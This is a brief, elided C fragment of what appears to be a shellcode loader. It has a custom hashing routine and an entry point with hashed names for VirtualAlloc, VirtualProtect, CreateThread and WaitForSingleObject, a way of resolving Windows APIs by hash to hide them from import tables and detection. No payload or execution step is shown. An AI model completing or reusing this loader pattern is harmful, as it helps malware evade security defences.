...
uint64_t hash(const uint8_t *data, size_t len) {
    ...
    for (size_t i = 0; i < len; i++) {
        hsh = (uint64_t)data[i] + (0x1003fULL * hsh);
        hsh ^= (hsh >> 13);
    }
...
void WINAPI EntryPoint(void) {
    uint32_t h_VirtualAlloc = 0xD0AF206A;
    uint32_t h_VirtualProtect = 0x3FB4EBE;
    uint32_t h_CreateThread = 0x5CFB17F0;
    uint32_t h_WaitForSingleObject = 0x97AE1F70;
